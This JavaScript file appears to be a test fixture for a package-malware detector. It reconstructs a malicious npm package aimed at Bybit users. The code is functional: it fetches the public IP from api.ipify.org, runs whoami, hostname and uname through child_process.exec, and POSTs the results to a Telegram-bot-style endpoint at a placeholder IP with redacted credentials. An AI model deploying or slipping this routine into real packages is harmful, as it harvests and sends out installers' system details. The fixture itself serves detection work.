// Reconstruction of byvendors@99.0.6 (2026-05-11).
// Pattern: active credential exfil to attacker Telegram bot, self-identifies
// as targeting Bybit. Public IP harvested via api.ipify.org. Author claimed
// to be "Chandan Mishra" (likely fake).
// The exact payload is not reproduced — fixture covers the muaddib signal:
//   - require('os'), require('https'), require('child_process').exec
//   - HTTPS POST to a third-party bot endpoint with sensitive payload
//   - exec() of shell commands to harvest local state
const os = require('os');
const https = require('https');
const { exec } = require('child_process');

const BOT_TOKEN = 'TELEGRAM_BOT_TOKEN_REDACTED';
const CHAT_ID = 'CHAT_ID_REDACTED';

function send(text) {
  const body = JSON.stringify({ chat_id: CHAT_ID, text: 'bybit-recon: ' + text });
  const req = https.request({
    host: '203.0.113.10',
    path: '/bot' + BOT_TOKEN + '/sendMessage',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': body.length }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

// Public-IP probe + local env harvest
https.get('https://api.ipify.org/?format=json', (res) => {
  let data = '';
  res.on('data', (c) => { data += c; });
  res.on('end', () => {
    exec('whoami && hostname && uname -a', (err, stdout) => {
      send('host=' + os.hostname() + ' user=' + os.userInfo().username + ' ip=' + data + ' shell=' + (stdout || ''));
    });
  });
});
